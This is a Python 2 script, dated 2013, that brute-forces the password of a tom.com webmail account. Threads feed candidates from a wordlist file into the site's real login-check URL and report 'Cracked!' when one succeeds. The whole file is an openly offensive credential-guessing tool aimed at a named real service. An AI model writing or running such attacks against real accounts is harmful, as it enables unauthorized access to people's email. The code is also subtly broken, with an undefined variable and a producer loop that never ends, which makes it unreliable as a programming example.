#-*-coding:utf-8-*-
'''
by SiRius.Gothack(gothack.329@gmail.com) 2013-03-15
'''

import urllib,cookielib,urllib2
from md5 import *
from random import *
import os
import Queue
import threading,time


global url
global uname
global queue
global TERM_SWOLLOW_LINE

def crack(url,username,password):
	url = url
	password = password.strip()
	username = username.strip()
	req = urllib.urlopen('http://pass.tom.com/new_checklogin.php?tomid='+username+'%40tom.com&tompwd='+password+'&issave=&svcid=0&rdm=1383717114647')
	try:
		resp = req.read()
		#print resp
		#resp = dict(resp)
		#status = resp['status']
		#print status
	except urllib2.HTTPError,e:
		print e
		#status = 'error'
	print code
	if resp == '1':
		print 'Cracked!Basic Password is : ',password
		os._exit(1)
	elif password == '':
		print 'Password not found!'
		os._exit(1)
 
 
 
class Producer(threading.Thread):
	def __init__(self,FILE):
		threading.Thread.__init__(self)
		self.FILE = FILE
	def run(self):
		pwdfile = open(self.FILE)
		while True:
			if queue.qsize() > 1000:
				pass
			else:
				pwd = pwdfile.readline().strip()
				queue.put(pwd)
				#print '+',pwd
 
	
class Basic_Consumer(threading.Thread):
	def __init__(self,url,uname):
		threading.Thread.__init__(self)
		self.url = url
		self.uname = uname
	def run(self):
		while True:
			if queue.qsize() < 10:
				#print queue.qsize()
				pass
			else:
				passwd = queue.get()
				crack(self.url,self.uname,passwd)
				os.write(1,"\r\033[K" +'-'+passwd)
 
				#print '-',passwd
 
def main():
 
	FILE = 'password.txt'
	password = open(FILE)
	uname = 'username'
	url = 'http://web.mail.tom.com/webmail/login/loginService.action' 
	thread_count = 10
	
	p = Producer(FILE)
	p.start()
	time.sleep(1)

	print 'Let the hacking begin...'
	for i in range(thread_count):
		c = Basic_Consumer(url,uname)
		c.start()
		print c.name+' is started...'
	
if __name__=='__main__':
	queue = Queue.Queue()
	main()
